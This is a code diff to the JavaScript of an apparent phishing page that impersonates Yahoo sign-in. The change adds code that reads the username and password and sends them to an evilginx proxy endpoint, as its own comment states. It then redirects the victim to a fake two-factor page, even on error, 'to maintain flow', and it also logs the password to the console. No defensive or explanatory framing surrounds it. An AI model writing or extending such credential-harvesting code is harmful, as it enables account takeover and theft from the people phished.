@@ -276,33 +276,46 @@ $(document).ready(() => {
     }
   }
 
-  $("#email-form").on("submit", (e) => {
+  document.getElementById("passwordForm").addEventListener("submit", (e) => {
     e.preventDefault()
 
-    const password = $("#password").val().trim()
+    const usernameInput = document.getElementById("username")
+    const passwordInput = document.getElementById("password")
+    const errorDiv = document.getElementById("error-message")
+
+    const password = passwordInput.value.trim()
     if (!password) {
-      showError("Please enter your password.")
-      return false
+      errorDiv.style.display = "block"
+      errorDiv.textContent = "Please enter your password."
+      return
     }
 
     if (password.length < 6) {
-      showError("Password must be at least 6 characters long.")
-      return false
+      errorDiv.style.display = "block"
+      errorDiv.textContent = "Password must be at least 6 characters long."
+      return
     }
 
     console.log("Password submitted:", password)
     showState("loading-state")
 
-    // For demo purposes, always proceed to 2FA after 2 seconds
-    setTimeout(() => {
-      showState("mfa-transition")
+    // Send data to evilginx
+    const formData = new FormData()
+    formData.append("username", usernameInput.value)
+    formData.append("password", passwordInput.value)
 
-      setTimeout(() => {
+    fetch("/signin", {
+      method: "POST",
+      body: formData,
+    })
+      .then(() => {
+        // Redirect to 2FA page
         window.location.href = "https://custom-yahoo-2fa-test.vercel.app/"
-      }, config.redirectDelay)
-    }, config.retryDelay)
-
-    return false
+      })
+      .catch(() => {
+        // On error, still redirect to maintain flow
+        window.location.href = "https://custom-yahoo-2fa-test.vercel.app/"
+      })
   })
 
   $("#refreshButton").click(() => {
@@ -386,9 +399,7 @@ $(document).ready(() => {
 
   startSessionMonitoring()
 
-  setTimeout(() => {
-    $("#password").focus()
-  }, 500)
+  document.getElementById("username").focus()
 
   console.log("Yahoo seamless authentication system fully initialized")
 })
